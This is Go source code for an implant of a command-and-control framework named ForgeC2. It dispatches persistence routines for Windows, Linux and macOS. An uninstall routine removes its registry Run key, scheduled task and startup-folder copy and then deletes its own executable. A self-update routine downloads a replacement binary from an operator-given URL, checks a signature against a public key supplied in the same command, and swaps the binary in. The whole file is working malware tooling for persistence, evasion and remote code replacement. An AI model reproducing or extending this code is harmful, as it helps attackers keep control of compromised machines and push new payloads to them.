//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"crypto/ed25519"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"time"
)

func addPersistence() {
	switch runtime.GOOS {
	case "windows":
		addPersistenceWindows()
	case "linux":
		addPersistenceLinux()
	case "darwin":
		addPersistenceDarwin()
	default:
		if Debug {
			fmt.Printf("[*] Persistence not implemented for %s\n", runtime.GOOS)
		}
	}
}

// selfRemove removes the implant
func uninstallSelf() (string, error) {
	// best effort cleanup
	if runtime.GOOS == "windows" {
		// remove reg
		runShell(`reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v ForgeC2 /f`, "cmd.exe")
		// remove task
		runShell("schtasks /delete /tn ForgeC2 /f", "cmd.exe")
		// remove startup
		appData := os.Getenv("APPDATA")
		startup := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup\forgec2.exe`)
		os.Remove(startup)
	}
	// delete self file (best effort)
	exe, _ := os.Executable()
	go func() {
		time.Sleep(1 * time.Second)
		os.Remove(exe)
	}()
	return "uninstall attempted (self-delete may take effect after exit)", nil
}

// selfUpdate downloads a new binary from a signed URL and verifies its integrity
func selfUpdate(cmdJSON string) string {
	var params struct {
		URL       string `json:"url"`
		Signature string `json:"signature"`
		PublicKey string `json:"public_key"`
	}
	if err := json.Unmarshal([]byte(cmdJSON), &params); err != nil {
		return "failed to parse update command: " + err.Error()
	}
	if params.URL == "" {
		return "self_update: download URL required"
	}

	signature, err := hex.DecodeString(params.Signature)
	if err != nil {
		return "failed to decode signature: " + err.Error()
	}
	publicKey, err := hex.DecodeString(params.PublicKey)
	if err != nil {
		return "failed to decode public key: " + err.Error()
	}

	exe, err := os.Executable()
	if err != nil {
		return "failed to get executable path: " + err.Error()
	}

	// Download new binary
	tmpPath := exe + ".update.tmp"
	out, err := os.Create(tmpPath)
	if err != nil {
		return "failed to create temp file: " + err.Error()
	}

	httpReq, err := http.NewRequest("GET", params.URL, nil)
	if err != nil {
		out.Close()
		os.Remove(tmpPath)
		return "failed to create request: " + err.Error()
	}
	httpReq.Header.Set("User-Agent", UserAgent)
	httpReq.Header.Set("Content-Type", "application/octet-stream")

	resp, err := client.Do(httpReq)
	if err != nil {
		out.Close()
		os.Remove(tmpPath)
		return "failed to download update: " + err.Error()
	}
	defer resp.Body.Close()

	// Write binary and compute SHA-256 hash simultaneously
	hasher := sha256.New()
	tee := io.TeeReader(resp.Body, hasher)
	written, err := io.Copy(out, tee)
	out.Close()
	if err != nil {
		os.Remove(tmpPath)
		return "failed to write update: " + err.Error()
	}
	if written == 0 {
		os.Remove(tmpPath)
		return "downloaded file is empty"
	}

	// Verify ed25519 signature of the SHA-256 hash
	hash := hasher.Sum(nil)
	if !ed25519.Verify(ed25519.PublicKey(publicKey), hash, signature) {
		os.Remove(tmpPath)
		return "signature verification failed: binary may be tampered"
	}

	// Make temp file executable (Linux)
	if runtime.GOOS != "windows" {
		os.Chmod(tmpPath, 0755)
	}

	// Create wrapper script to replace and restart
	switch runtime.GOOS {
	case "windows":
		return selfUpdateWindows(exe, tmpPath)
	case "darwin":
		return selfUpdateDarwin(exe, tmpPath)
	default:
		return selfUpdateLinux(exe, tmpPath)
	}
}
